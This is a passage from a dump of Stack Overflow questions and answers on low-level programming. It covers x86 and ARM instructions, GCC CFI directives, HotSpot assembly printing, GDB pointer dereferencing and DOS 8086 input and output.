<li><p>Now open proteus and make the design which will include the required microcontroller and the double click on the microcontoller and then include that hex file which was created . This way you can simulate your design . </p></li>
</ol>
","17258319"
"How can I write a ""Hello World"" app in assembly language?","14419","","<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""https://stackoverflow.com/questions/1023593/how-to-write-hello-world-in-assembler-under-windows"">how to write hello world in assembler under windows?</a>  </p>
</blockquote>



<p>I've often heard of applications written using the language of the gods, assembly language. I've never tried though, and I don't even have a clue how to do it.</p>

<p>If I wanted to dabble, how would I go about doing it? I know absolutely nothing about what is required, although presumably some kind of compiler and Notepad.</p>

<p>Just purely out of curiousity, what would I need to write a ""Hello World!"" application?</p>

<p>Edit to add, I am running Windows 7 64bit</p>

<p>Edit to add, I wonder if there is an assembly language plugin for Visual Studio?</p>
","<p>Have a look at <a href=""http://www.winasm.net/"" rel=""nofollow noreferrer"">WinAsm</a>.</p>
","2653866"
"What is the x86 ""ret"" instruction equivalent to?","14395","","<p>Say I'm writing a routine in x86 assembly, like, ""add"" which adds two numbers passed as arguments.</p>

<p>For the most part this is a very simple method:</p>

<pre><code>push ebp
mov ebp, esp
mov eax, [ebp+8]
add eax, [ebp+12]
mov esp, ebp
pop ebp
ret
</code></pre>

<p>But, is there any way I could rewrite this method to avoid the use of the ""ret"" instruction and still have it produce the exact same result?</p>
","<p>This does not need any free registers to simulate <code>ret</code>, but it needs 4 bytes of memory (a dword). Uses indirect <code>jmp</code>. <strong>Edit:</strong> As noted by Ira Baxter, this code is not reentrant. Works fine in single-threaded code. Will crash if used in multithreaded code.</p>

<pre>
push ebp
mov  ebp, esp
mov  eax, [ebp+8]
add  eax, [ebp+12]
mov  ebp, [ebp+4]
mov  [return_address], ebp
pop  ebp

add  esp,4
jmp  [return_address]

.data
return_address dd 0
</pre>

<p>To replace only the <code>ret</code> instruction, without changing the rest of the code. Not reentrant. Do not use in multithreaded code. <strong>Edit:</strong> fixed bug in below code.</p>

<pre>
push ebp
mov  ebp, esp
mov  ebp, [ebp+4]
mov  [return_address], ebp
pop  ebp

add  esp,4
jmp  [return_address]

.data
return_address dd 0
</pre>
","20132835"
"How to: pow(real, real) in x86","14349","","<p>I'm looking for the implementation of <code>pow(real, real)</code> in x86 Assembly. Also I'd like to understand how the algorithm works.</p>
","<p>Just compute it as <code>2^(y*log2(x))</code>.</p>

<p>There is a x86 instruction FYL2X to compute y*log2(x) and a x86 instruction F2XM1 to do exponentiation. F2XM1 requires an argument in [-1,1] range, so you'd have to add some code in between to extract the integer part and the remainder, exponentiate the remainder, use FSCALE to scale the result by an appropriate power of 2.</p>
","4638502"
"cmp and ja question","14314","","<p>I'm having problems understanding this. It's in intel syntax</p>

<pre><code>cmp eax, 0x19
ja greater
</code></pre>

<p>eax contains the value -40. <a href=""http://en.wikibooks.org/wiki/X86_Assembly/Control_Flow"" rel=""nofollow"">http://en.wikibooks.org/wiki/X86_Assembly/Control_Flow</a> tells me ja is the unsigned comparison from the previous cmp.</p>

<p>As far as I know, this should jump IF arg1 (0x19) is ABOVE arg2 (0xffffffd8)</p>

<p>0x19 looks smaller than 0xffffffd8 to me. The jump is being performed. Any help understanding my flawed logic much appreciated!</p>
","<p>This is a little hard to answer because different assemblers reverse the order of operands. From the looks of things, you seem to be using Intel syntax assembly, in which case what you have is roughly equivalent to <code>if (unsigned)eax &gt; 0x19 goto greater</code>. That being the case, it's reasonable that the jump is taken.</p>
","5540153"
"Get address of current instruction for x86","14303","","<p>I am using Linux with x86 (64 bit to be precise). Is there a way I can get the address of the current instruction. Actually I want to write my own simplified versions of <strong>setjmp/longjmp</strong>. <a href=""https://stackoverflow.com/questions/6145173/how-does-longjmp-work"">Here</a>, R.. posted a simplified version of <strong>longjmp</strong>. Any idea how <strong>setjmp</strong> is implemented. A simplified version that is, without taking into account of exceptions and signals etc...</p>
","<p>I believe in 64-bit code you can simply do <code>lea rax, [rip]</code>.</p>

<p>The 32-bit idiom is:</p>

<pre><code>      call next
next: pop eax
</code></pre>
","7932364"
"What does `rep ret` mean?","14293","","<p>I was testing some code on Visual Studio 2008 and noticed <code>security_cookie</code>. I can understand the point of it, but I don't understand what the purpose of this instruction is.</p>

<pre><code>    rep ret /* REP to avoid AMD branch prediction penalty */
</code></pre>

<p>Of course I can understand the comment :) but what is this prefix exaclty doing in context with the <code>ret</code> and what happens if <code>ecx</code> is != 0? Apparently the loop count from <code>ecx</code> is ignored when I debug it, which is to be expected.</p>

<p>The code where I found this was here (injected by the compiler for security):</p>

<pre><code>void __declspec(naked) __fastcall __security_check_cookie(UINT_PTR cookie)
{
    /* x86 version written in asm to preserve all regs */
    __asm {
        cmp ecx, __security_cookie
        jne failure
        rep ret /* REP to avoid AMD branch prediction penalty */
failure:
        jmp __report_gsfailure
    }
}
</code></pre>
","<p>There's a whole blog named after this instruction. And the first post describes the reason behind it: <a href=""http://repzret.org/p/repzret/"">http://repzret.org/p/repzret/</a></p>

<p>Basically, there was an issue in the AMD's branch predictor when a single-byte <code>ret</code> immediately followed a conditional jump as in the code you quoted (and a few other situations), and the workaround was to add the <code>rep</code> prefix, which is ignored by CPU but fixes the predictor penalty.</p>
","20526918"
"Invalid constant after fixup?","14254","","<p>For some reason, when I try to compile this bit of code, the compiler says <code>syscall.s:72:invalid constant (0x172) after fixup</code>:</p>

<pre><code>.globl _mach_msg_trap$MACH
_mach_msg_trap$MACH:
    stmfd sp!, {r4,r7}
    mov r7, #370 /* this is line 72 */
    svc 0
    ldmfd sp!, {r4, r7}
    bx lr
</code></pre>

<p>I don't know why it's doing it. When I put a smaller constant into <code>r7</code>, it works fine. But with higher numbers, it spits out this error. I've temporary fixed it by doing <code>mov r7, #300</code> and <code>add r7, #70</code>, which achieves the desired effect. Still not sure what caused the error though.</p>
","<p>The ARM Instruction is only able to load a limited range of immediate values with mov. The problem is that the value has to be encoded in the mov instruction itself. As all ARM Instructions are 32-bit wide, the original instruction-set up to ARMv5 only had a total of 8+4 bits to encode immediates. With the first 8-bit being able to load any 8-bit value int in the range of 0-255 and the 4 bit being a right rotate in steps of 2 between 0 and 30.</p>

<p>So you can load values like:</p>

<pre><code>#0
#122
#121 ror #24 = 30976
#230 ror #12 = 241172480
</code></pre>

<p>But, #370 is not loadable with this scheme, it would require something like <code>#185 ror #31</code> which is not possible.</p>

<p>There are two ways to get your immediate value loaded.</p>

<ol>
<li>How you already solved it by constructing the value in multiple steps.</li>
<li>By loading the value from memory with ldr: <code>ldr r7,=#370</code> The assembler then will create a constant-pool and load the value from there via pc-relative addressing.</li>
</ol>

<p>Usually you should prefer to construct constants with up to 2 instructions, if thats not possible (or the value has to be relocatable) use ldr.</p>

<p>Starting with ARMv7 you can also use <code>movw</code> to load any 16 bit value in the lower half of a register while zeroing the top-half and <code>movt</code> to load another 16bit value to the upper half without touching the lower half.</p>
","10261746"
"GAS: Explanation of .cfi_def_cfa_offset","14237","","<p>I would like an explanation for the values used with the .cfi_def_cfa_offset directives in assembly generated by GCC. I know vaguely that the .cfi directives are involved in call frames and stack unwinding, but I would like a more detailed explanation of why, for example, the values 16 and 8 are used in the assembly outputted by GCC in compiling the following C program on my 64-bit Ubuntu machine.</p>

<p>The C program:</p>

<pre><code>#include &lt;stdio.h&gt;

int main(int argc, char** argv)
{
        printf(""%d"", 0);
        return 0;
}
</code></pre>

<p>I invoked GCC on the source file test.c as follows: <code>gcc -S -O3 test.c</code>. I know that -O3 enables nonstandard optimization, but I wanted to limit the size of the generated assembly for the sake of brevity.</p>

<p>The generated assembly:</p>

<pre><code>        .file   ""test.c""
        .section        .rodata.str1.1,""aMS"",@progbits,1
.LC0:
        .string ""%d""
        .text
        .p2align 4,,15
.globl main
        .type   main, @function
main:
.LFB22:
        .cfi_startproc
        subq    $8, %rsp
        .cfi_def_cfa_offset 16
        xorl    %edx, %edx
        movl    $.LC0, %esi
        movl    $1, %edi
        xorl    %eax, %eax
        call    __printf_chk
        xorl    %eax, %eax
        addq    $8, %rsp
        .cfi_def_cfa_offset 8
        ret
            .cfi_endproc
.LFE22:
        .size   main, .-main
        .ident  ""GCC: (Ubuntu/Linaro 4.5.2-8ubuntu4) 4.5.2""
        .section        .note.GNU-stack,"""",@progbits
</code></pre>

<p>Why are the values 16 and 8 used for the .cfi_def_cfa_offset directives in the generated assembly? Also, why is the number 22 used for the local function begin and function end labels?</p>
","<p>As the <a href=""http://dwarfstd.org/doc/DWARF4.pdf"" rel=""noreferrer"">DWARF spec</a> says in section 6.4:</p>

<blockquote>
  <p>[...] The call frame is 
  identified by an address on the stack. We refer to this address as the Canonical Frame 
  Address or CFA. Typically, the CFA is defined to be the value of the stack pointer at the 
  call site in the previous frame (which may be different from its value on entry to the 
  current frame). </p>
</blockquote>

<p><code>main()</code> is called from somewhere else (in the <code>libc</code> C runtime support code), and, at the time the <code>call</code> instruction is executed, <code>%rsp</code> will point to the top of the stack (which is the lowest address - the stack grows downwards), whatever that may be (exactly what it is doesn't matter here):</p>

<pre><code>:                :                              ^
|    whatever    | &lt;--- %rsp                    | increasing addresses
+----------------+                              |
</code></pre>

<p>The value of <code>%rsp</code> at this point is the ""value of the stack pointer at the call site"", i.e. the CFA as defined by the spec.</p>

<p>As the <code>call</code> instruction is executed, it will push a 64-bit (8 byte) return address onto the stack:</p>

<pre><code>:                :
|    whatever    | &lt;--- CFA
+----------------+
| return address | &lt;--- %rsp == CFA - 8
+----------------+
</code></pre>

<p>Now we are running the code at <code>main</code>, which executes <code>subq $8, %rsp</code> to reserve another 8 bytes of stack for itself:</p>

<pre><code>:                :
|    whatever    | &lt;--- CFA
+----------------+
| return address |
+----------------+
| reserved space | &lt;--- %rsp == CFA - 16
+----------------+
</code></pre>

<p>The change of stack pointer is declared in the debugging information using the <code>.cfi_def_cfa_offset</code> directive, and you can see that the CFA is now at an offset of 16 bytes from the current stack pointer.</p>

<p>At the end of the function, the <code>addq $8, %rsp</code> instruction changes the stack pointer again, so another <code>.cfi_def_cfa_offset</code> directive is inserted to indicate that the CFA is now at an offset of only 8 bytes from the stack pointer.</p>

<p>(The number ""22"" in the labels is just an arbitrary value.  The compiler will generate unique label names based on some implementation detail, such as its internal numbering of basic blocks.)</p>
","7535848"
"how do procedure calls work in assembler?","14236","","<p>I just started tinkering with ASM and I'm not sure if my understanding of procedure calls is correct.</p>

<p>say at some point in the code there is a procedure call</p>

<pre><code>call dword ptr[123]
</code></pre>

<p>and the procedure consists of only one command, ret:</p>

<pre><code>ret 0004
</code></pre>

<p>what would be the effect of this procedure call, and where would the return value be stored? I read somewhere that a return value of 2 bytes would be stored in AX, but when I replace the procedure call by</p>

<pre><code>mov AX, 0004
</code></pre>

<p>(together with the necessary NOPs) the program crashes.</p>
","<p>in x86 assembler the parameter to the <code>ret</code> instruction means:</p>

<p><code>RET <i>immediate</i></code></p>

<blockquote>
  <p>Return to calling procedure and pop <em>immediate</em> bytes from the stack.</p>
</blockquote>

<p>(quoting from <a href=""http://www.intel.com/products/processor/manuals/index.htm"" rel=""noreferrer"">Intel® 64 and IA-32 Architectures Software Developer's Manuals</a> <a href=""http://www.intel.com/Assets/PDF/manual/253667.pdf"" rel=""noreferrer"">Vol 2B</a>)</p>

<p>So when you type:</p>

<pre><code>ret 0004
</code></pre>

<p>You're telling the CPU to return to the instruction immediately after the <code>call</code>, and to pop 4 bytes off the stack.  This is great if you <em>pushed</em> 4 bytes onto the stack before the call.</p>

<pre><code>push eax
call dword ptr[123]
</code></pre>

<p>Note that this has nothing to do with the return value.  In fact, a procedure in Assembly has no way of specifying that a value is a <em>return</em> value.  This is all done by convention.  Most compilers of which I am aware will use <code>EAX</code> to hold the return value, but this is true only because the <em>calling</em> function will expect the result there.</p>

<p>So your calling code would be:</p>

<pre><code>call dword ptr [123]
mov dword ptr [result], eax
</code></pre>

<p>and your function that returns the value 4 would be:</p>

<pre><code>mov eax, 4
ret
</code></pre>
","1251111"
"Is it possible to convert C/C++ source code to assembly?","14232","","<p>Is it possible to somehow convert a simple C or C++ code (by simple I mean: taking some int as input, printing some simple shapes dependent on that int as output) to assembly language? If there isn't I'll just do it manually but since I'm gonna be doing it for processors like Intel 8080, it just seemed a bit tedious. Can you somehow automate the process?</p>

<p>Also, if there is a way, how good (as in: elegant) would the output assembly file source code be when compared to just translating it manually?</p>
","<p>Most compilers will let you produce assembly output. For a couple of obvious examples, Clang and gcc/g++ use the <code>-S</code> flag, and MS VC++ uses the <code>-Fa</code> flag to do so.</p>

<p>A few compilers don't support this directly (e.g., if memory serves Watcom didn't). The ones I've seen like this had you produce an object file, and then included a disassembler that would produce an assembly language file from the object file. I don't remember for sure, but it wouldn't surprise me if this is what you'd need to do with the Digital Mars compiler.</p>

<p>To somebody who's accustomed to writing assembly language, the output from most compilers typically tends to look at least somewhat inelegant, especially on a CPU like an x86 that has quite a few registers that are now really general purpose, but have historically had more specific meanings. For example, if some piece of code needs both a pointer and a counter, a person would probably put the pointer in ESI or EDI, and the counter in ECX. The compiler might easily reverse those. That'll <em>work</em> fine, but an experienced assembly language programmer will undoubtedly find it more readable using ESI for the pointer and ECX for the counter.</p>
","19960982"
"How to use -XX:+UnlockDiagnosticVMOptions -XX:CompileCommand=print option with JVM HotSpot","14212","","<p>I 'm trying to use <code>-XX:+UnlockDiagnosticVMOptions -XX:CompileCommand=print,*MyClass.myMethod</code> command lines as described in <a href=""https://stackoverflow.com/questions/9336704/jvm-option-to-optimize-loop-statements#answer-9337542"">this post</a>.</p>

<p>It seems thats it's available with <code>open-jdk</code> (<a href=""https://wikis.oracle.com/display/HotSpotInternals/PrintAssembly"" rel=""nofollow noreferrer"">https://wikis.oracle.com/display/HotSpotInternals/PrintAssembly</a>).</p>

<p><strong>How can I use those options (or similar equivalents) with oracle JDK7 and the JVM HotSpot?</strong></p>
","<p>These instructions apply to Linux (Ubuntu 10.04.4 LTS), but should be applicable for your OS. After downloading <a href=""http://www.oracle.com/technetwork/java/javase/downloads/jdk-7u3-download-1501626.html"" rel=""noreferrer"">Oracle JDK 7u3</a> and appropriately setting your <code>JAVA_HOME</code> and <code>PATH</code> environment variables, execute the following to check available options:</p>

<pre><code>java -XX:+AggressiveOpts -XX:+UnlockDiagnosticVMOptions -XX:+UnlockExperimentalVMOptions -XX:+PrintFlagsFinal -version
</code></pre>

<p>You should see the <code>UnlockDiagnosticVMOptions</code>, <code>CompileCommand</code> and <code>PrintAssembly</code> options are available. Using the <code>CompileCommand</code> option will also enable the <code>PrintAssembly</code> option. However, you will need the HotSpot disassembler plugin for <code>PrintAssembly</code> to work; without it, you might see something like the following:</p>

<pre><code>$ java -version
java version ""1.7.0_03""
Java(TM) SE Runtime Environment (build 1.7.0_03-b04)
Java HotSpot(TM) Server VM (build 22.1-b02, mixed mode)
$ java -server -XX:+UnlockDiagnosticVMOptions '-XX:CompileCommand=print,*Main.main' Main
CompilerOracle: print *Main.main
Java HotSpot(TM) Server VM warning: printing of assembly code is enabled; turning on DebugNonSafepoints to gain additional output
Compiled method (c2)      68    1 %           Main::main @ 4 (49 bytes)
 total in heap  [0xb3a97548,0xb3a979ec] = 1188
 relocation     [0xb3a97610,0xb3a97624] = 20
 main code      [0xb3a97640,0xb3a97840] = 512
 stub code      [0xb3a97840,0xb3a97850] = 16
 oops           [0xb3a97850,0xb3a97858] = 8
 scopes data    [0xb3a97858,0xb3a97898] = 64
 scopes pcs     [0xb3a97898,0xb3a979e8] = 336
 dependencies   [0xb3a979e8,0xb3a979ec] = 4
Could not load hsdis-i386.so; library not loadable; PrintAssembly is disabled
OopMapSet contains 1 OopMaps
</code></pre>

<p>To get the HotSpot disassembler plugin, you will need to build it. Looking at the OpenJDK 7u2 source, the <a href=""http://hg.openjdk.java.net/jdk7u/jdk7u2/hotspot/file/0744602f85c6/src/share/tools/hsdis/README"" rel=""noreferrer"">hsdis plugin readme</a> says:</p>

<blockquote>
  <p>To use the plugin with a JVM, you need a new version that can load it.
  If the product mode of your JVM does not accept -XX:+PrintAssembly,
  you do not have a version that is new enough.</p>
  
  <p>To build this project you [need] a copy of GNU binutils to build against.</p>
  
  <p>In theory this should be buildable on Windows but getting a working
  GNU build environment on Windows has proven difficult.</p>
</blockquote>

<p>We have confirmed above that Oracle JDK 7u3 supports <code>PrintAssembly</code>. I followed the hsdis plugin readme instructions, downloaded GNU binutils 2.22, placed it in the hsdis <code>build/binutils</code> directory and ran <code>make</code>. This eventually produced the following error:</p>

<pre><code>hsdis.c:32:20: error: sysdep.h: No such file or directory
</code></pre>

<p>To correct this, I changed hsdis.c using the following patch:</p>

<pre><code>diff -r 6259c6d3bbb7 src/share/tools/hsdis/hsdis.c
--- a/src/share/tools/hsdis/hsdis.c Mon Dec 12 23:08:01 2011 -0800
+++ b/src/share/tools/hsdis/hsdis.c Thu Feb 23 09:26:37 2012 -0500
@@ -29,7 +29,7 @@

 #include ""hsdis.h""

-#include &lt;sysdep.h&gt;
+#include &lt;errno.h&gt;
 #include &lt;libiberty.h&gt;
 #include &lt;bfd.h&gt;
 #include &lt;dis-asm.h&gt;
</code></pre>

<p>Running <code>make</code> was then successful. Now just copy the <code>hsdis-i386.so</code> plugin in the hsdis <code>build</code> directory to the Oracle JDK 7u3 <code>jre/lib/i386</code> directory.</p>

<p>Now you can see the disassembled compiled code:</p>

<pre><code>$ java -server -XX:+UnlockDiagnosticVMOptions '-XX:CompileCommand=print,*Main.main' Main
CompilerOracle: print *Main.main
Java HotSpot(TM) Server VM warning: printing of assembly code is enabled; turning on DebugNonSafepoints to gain additional output
Compiled method (c2)      68    1 %           Main::main @ 4 (49 bytes)
 total in heap  [0xb3999548,0xb39999ec] = 1188
 relocation     [0xb3999610,0xb3999624] = 20
 main code      [0xb3999640,0xb3999840] = 512
 stub code      [0xb3999840,0xb3999850] = 16
 oops           [0xb3999850,0xb3999858] = 8
 scopes data    [0xb3999858,0xb3999898] = 64
 scopes pcs     [0xb3999898,0xb39999e8] = 336
 dependencies   [0xb39999e8,0xb39999ec] = 4
Loaded disassembler from [snip]/jdk1.7.0_03/jre/lib/i386/hsdis-i386.so
Decoding compiled method 0xb3999548:
Code:
[Disassembling for mach='i386']
[Entry Point]
[Verified Entry Point]
[Constants]
  # {method} 'main' '([Ljava/lang/String;)V' in 'Main'
  0xb3999640: call   0xb6ff8510         ;   {runtime_call}
  0xb3999645: data32 xchg %ax,%ax
  0xb3999648: mov    %eax,-0x3000(%esp)
  0xb399964f: push   %ebp
  0xb3999650: sub    $0x38,%esp
  0xb3999656: mov    %ecx,%esi
  0xb3999658: mov    0x4(%esi),%ebp
  0xb399965b: mov    0x8(%esi),%edi
  0xb399965e: mov    (%ecx),%esi
  0xb3999660: mov    %ecx,(%esp)
  0xb3999663: call   0xb7078cf0         ;*iload_3
[snip]
  0xb399983e: hlt    
  0xb399983f: hlt    
[Exception Handler]
[Stub Code]
  0xb3999840: jmp    0xb39981e0         ;   {no_reloc}
[Deopt Handler Code]
  0xb3999845: push   $0xb3999845        ;   {section_word}
  0xb399984a: jmp    0xb397e220         ;   {runtime_call}
  0xb399984f: .byte 0x0
OopMapSet contains 1 OopMaps

#0 
OopMap{off=468}
</code></pre>

<p>The test class I've used is:</p>

<pre><code>public class Main {
    public static void main(final String[] args) {
        long x = 0;
        for (int i = 0; i &lt; 1000000; i++) {
            x += calculate(i);
        }
        System.out.println(""x="" + x);
    }

    private static long calculate(final int i) {
        return (long)i * (long)i;
    }
}
</code></pre>
","9415368"
"How to move 128-bit immediates to XMM registers","14141","","<p>There already is <a href=""https://stackoverflow.com/questions/4609677/implementation-of-aes-in-assembly"">a question</a> on this, but it was closed as ""ambiguous"" so I'm opening a new one - I've found the answer, maybe it will help others too.</p>

<p>The question is: how do you write a sequence of assembly code to initialize an XMM register with a 128-bit immediate (constant) value?</p>
","<p>Just wanted to add that one can read about generating various constants using assembly in Agner Fog's manual <a href=""http://www.agner.org/optimize/optimizing_assembly.pdf"">Optimizing subroutines in assembly language</a>, Generating constants, section 13.4, page 121.</p>
","6654276"
"GDB: Attempt to dereference generic pointer","14112","","<p>How can I make GDB do extra dereferences in a printing function like
<code>x/s</code>?</p>

<p>When I try explicit dereferences in <code>x/</code> I get the error ""Attempt to
dereference a generic pointer"". Using <code>x/</code> multiple times works, since
each use includes an implicit dereference, but this is annoying since
I have to copy and paste each intermediate result.</p>

<h1>Example</h1>

<p>Consider the very useful C program, <code>example.c</code>:</p>

<pre><code>#include &lt;stdio.h&gt;
int main(int argc, char **argv) {
  printf(""argv[0] = %s\n"", argv[0]);
}
</code></pre>

<p>If I build it and load it into GDB, I see that <code>argv</code> is stored at
<code>0xc(%ebp)</code>, since a double dererence of that is passed as the second
argument to <code>printf</code> (i.e. in <code>0x4(%esp)</code>) on line 26:</p>

<pre><code>$ gcc -o example example.c
$ gdb example

(gdb) disass main
Dump of assembler code for function main:
   0x080483e4 &lt;+0&gt;:   push   %ebp
   0x080483e5 &lt;+1&gt;:   mov    %esp,%ebp
   0x080483e7 &lt;+3&gt;:   and    $0xfffffff0,%esp
   0x080483ea &lt;+6&gt;:   sub    $0x10,%esp
   0x080483ed &lt;+9&gt;:   mov    0xc(%ebp),%eax
   0x080483f0 &lt;+12&gt;:  mov    (%eax),%edx
   0x080483f2 &lt;+14&gt;:  mov    $0x80484e0,%eax
   0x080483f7 &lt;+19&gt;:  mov    %edx,0x4(%esp)
   0x080483fb &lt;+23&gt;:  mov    %eax,(%esp)
   0x080483fe &lt;+26&gt;:  call   0x8048300 &lt;printf@plt&gt;
   0x08048403 &lt;+31&gt;:  leave  
   0x08048404 &lt;+32&gt;:  ret    
End of assembler dump.
</code></pre>

<p>I break at <code>printf</code> and run the program with arguments <code>first</code> and
<code>second</code>:</p>

<pre><code>(gdb) break *main + 26
Breakpoint 1 at 0x80483fe

(gdb) run first second
Starting program: /var/tmp/SO-attempt-to-dereference-generic-pointer/example first second
</code></pre>

<p>I attempt to print <code>argv[0]</code> in GDB, but I get the ""generic pointer""
error:</p>

<pre><code>Breakpoint 1, 0x080483e5 in main ()
(gdb) x/s **(0xc + $ebp)
Attempt to dereference a generic pointer.
</code></pre>

<p>However, by using 'x/xw' to manually dereference a few times, I'm
eventually able to print <code>argv[0]</code> (and <code>argv[1]</code>):</p>

<pre><code>(gdb) x/xw 0xc + $ebp
0xbfffeba4: 0xbfffec34
(gdb) x/xw 0xbfffec34
0xbfffec34: 0xbfffedc8
(gdb) x/s 0xbfffedc8
0xbfffedc8:  ""/var/tmp/SO-attempt-to-dereference-generic-pointer/example""

(gdb) x/xw 0xbfffec34 + 4
0xbfffec38: 0xbfffee03
(gdb) x/s 0xbfffee03
0xbfffee03:  ""first""
(gdb) 
</code></pre>

<p>But this is annoying and indirect (as pointer programming is wont to be?)</p>
","<p>The solution is to cast the pointers before dereferencing them.</p>

<p>For example, picking up where we left off above:</p>

<pre><code>(gdb) x/s **((char ***) (0xc + $ebp))
0xbfffedc8:  ""/var/tmp/SO-attempt-to-dereference-generic-pointer/example""
(gdb) x/s *(*((char ***) (0xc + $ebp)) + 1)
0xbfffee03:  ""first""
(gdb) x/s *(*((char ***) (0xc + $ebp)) + 2)
0xbfffee09:  ""second""
</code></pre>

<p>Note that the stack address <code>0xc + $ebp</code> is itself a pointer to the
contents of that stack location, and so we need <code>char ***</code> and not
<code>char **</code>.</p>
","20414700"
"How to create nested loops in x86 assembly language","14092","","<p>Is it possible to create nested loops in x86 assembly language?</p>

<p>I'd like to translate this psedocode into correct x86 assembly code (using <a href=""http://en.wikipedia.org/wiki/Microsoft_Macro_Assembler"" rel=""nofollow"">MASM</a> syntax), but I'm not sure how to initialize each loop counter here. Is it even possible to declare local variables in x86 assembly (as in most other programming languages)?</p>

<pre><code>for (var i = 0; i &lt; 10; i++){
    for(var j = 0; j &lt; 10; j++){
        for(var k = 0; k &lt; 10; k++){
            mov eax, i + j + k;
        }
    }
}
</code></pre>
","<p>Sure, it's possible. Since every computer program eventually boils down to assembly - it is naturally the most powerful language possible (excluding direct bit manipulation).</p>

<p>The actual code depends on your system, compiler and applied optimizations, but basically it should be something like this (example for 2 nested loops, not 3):</p>

<pre><code>           mov ecx, 0

outerLoop:

           cmp ecx, 10
           je done
           mov ebx, 0

innerLoop:
           mov eax, ecx        ; do your thing here
           add eax, ebx

           cmp ebx, 10
           je innerLoopDone
           inc ebx
           jmp innerLoop

innerLoopDone:

           inc ecx
           jmp outerLoop
done:
</code></pre>

<p>Note, you don't need local variables, you've got general-purpose registers for the usage that you need. If you insist on having variables, you can use memory addresses for that and read/write using register pointers.</p>
","15995784"
"Assembly Language: difference between ja and jg?","14070","","<p>I am having trouble understanding the difference between ja and jg for assembly language. I have a section of code:</p>

<pre><code>cmp  dh, dl
j--  hit
</code></pre>

<p>and am asked which conditional jump to hit (that replaces j-- hit) will be taken with the hex value of DX = 0680.</p>

<p>This would make dl = 06 and dh = 80, so when comparing, 80 > 06. I know that jg fits this as we can directly compare results, but how should I approach solving if ja fits (or in this case, does not fit) this code?</p>
","<ol>
<li>If <code>dx</code> is 0x0680, then <code>dh</code> is 0x06 and <code>dl</code> is 0x80.</li>
<li>0x80 is interpreted as 128 in unsigned mode, and -128 in signed mode.</li>
<li>Thus, you have to use <code>jg</code>, since 6 > -128, but 6 &lt; 128. <code>jg</code> does signed comparison; <code>ja</code> does unsigned comparison.</li>
</ol>
","7510447"
"How to output a value stored in a variable in assembly 8086?","14028","","<p>I am learning assembly programming using ""8086 emu"" (Its a software program . Emulator .) I am evaluating a basic expression -  </p>

<p><strong>a=b+c-d*e</strong> </p>

<p>My problem is that when I am using int 21h to take in values , Its taking only single digit (character) as input for each variable .  </p>

<p>Also after the evaluation , I am <strong>unable to print the value stored in the variable 'a' on the output screen</strong> . </p>

<p>Can anyone give a solution for both the problems ?</p>
","<p>For the first part (reading in a string until a sentinel key, e.g. the enter key is hit), you'll write a loop to do that.</p>

<p>A function for parsing the ASCII decimal string into a register value is also needed.</p>

<p>For printing to screen, you'll need:</p>

<ul>
<li>Either <code>int 21h, AH = 02h</code> ( <a href=""http://www.ctyme.com/intr/rb-2554.htm"" rel=""nofollow"">http://www.ctyme.com/intr/rb-2554.htm</a> ) one character at a time</li>
<li>Or <code>int 21h, AH = 09h</code> ( <a href=""http://www.ctyme.com/intr/rb-2562.htm"" rel=""nofollow"">http://www.ctyme.com/intr/rb-2562.htm</a> ) one whole string </li>
</ul>

<p>You'll also need an itoa function (http://www.cplusplus.com/reference/clibrary/cstdlib/itoa/) to convert a register value into a multi-digit ASCII string.</p>

<p>The URLs is part of an assembly programming tutorial called Ralf Brown's Interrupt List (RBIL).</p>
","9714005"
"Assembly: How to convert hex input to decimal?","14008","","<p>I have found many questions on this issue, however, I have not been able to get my code to run. My program should take a hex value, check to see if it is a valid hex character, then display the hex value as a decimal value. If it is a lower case hex character then it needs to be converted to upper case. All this needs to be in a loop.</p>

<p>I have all of this done except for converting the hex to decimal. I have the code in the program I think should convert it, but it will not compile. I will list the compiler errors below the code. If the code in the label convert: is commented out(except for the last line, ""jmp display"") then the program will run as it should, but obviously will not show the value as a decimal.</p>

<p>Compiling with nasme: ""nasm -fbin getChar.asm -o getChar.com -l getChar.lst""</p>

<p>I am running the program in dosbox. </p>

<pre><code>; This program gets a char from user and prints it out as a decimal 

    org 100h        ; program start point
section .data
    msgIn:  DB  13, 10, ""Enter a Hex Digit: $""
    msgOut: DB  13, 10, ""Decimal Value: $""
    msgOpt: DB  13, 10, ""Enter another?(y or n): $""
    errMsg: DB  13, 10, ""Illegal character, Enter 0..9 or A..F: $""
    HNUM:   DB  19H
    NUM:    DB  0
    D:      DB  10h
    H:      DB  16
    CNT:    DB  0

section .text

continue:               ; start of loop
        mov dx, msgIn   ; offset address of message to display
        mov ah, 9       ; print string function
        int 21h

        mov ah, 1       ; keyboard input sub-program
        int 21h         ; read character into al
        mov cl, al

legal:                  ; compare input to see if valid
        cmp cl, 48      ; cl &lt; 0
        jl  end_if      ; yes, error msg
        cmp cl, 70      ; cl &gt; F
        jg  check_case  ; yes, error msg

        jmp prntMsg2    ; print value of input

check_case:             ; check case of input
        cmp cl, 97      ; cl &lt; a
        jl  end_if      ; yes, error msg
        cmp cl, 102     ; cl &gt; f
        jg  end_if      ; yes, error msg

        jmp to_upper    ; need to send to function to convert to upper case
                        ; then pass to prntMsg2

to_upper:
        and al, 223 ; convert to upper case(0DFh)

        jmp prntMsg2

end_if:                 ; error message if invalid input
        mov ah, 9
        mov dx, errMsg  ; print error message
        int 21h

        jmp continue    ; get a new value

prntMsg2:               ; print second message*****
        mov dx, msgOut  ; offset of second message
        mov ah, 9       ; print string function
        int 21h         ; display message

convert:
        mov cx, 00
        mov dx, 00

    L6: mov ax, 00
        mov al, [HNUM]
        div word [D]
        mov [HNUM], al

        mov bx, ax
        mov cl, 0
        mov ax, 1
    L5: 
        cmp cl, 00
        je L7
        mul word [H]
        sub cl, 1
        jmp L5
    L7: 
        mul bh
        add dx, ax
        add word [CNT], 1
        cmp word [HNUM], 0
        jg L6
        mov [NUM], dl

        jmp display

display:                ; display character
        mov dl, al
        mov ah, 2       ; print char function
        int 21h

        mov ah, 9       ; see if user wants to do it again
        mov dx, msgOpt
        int 21h

        mov ah, 1
        int 21h
        mov bl, al
        cmp bl, 'y'     ; bl = y
        jne exitPrg     ; no, end

        jmp continue    ; get a new value

exitPrg:                ; exit program
        mov ah, 4ch     ; exit to DOS function
        int 21h         ; see you later!
</code></pre>

<p>The code above has been edited and now compiles and runs. However, it is still not doing the conversion from hex to decimal correctly. It simply doesn't display a value, just blank. It will also hang up if a letter is entered, even a letter a-f. A number does not hang it up, but still a value is not displayed.</p>

<p>Now that I have it running at least I can work on fixing it, however, any guidance is appreciated. Thanks Gene for getting me up and running.</p>
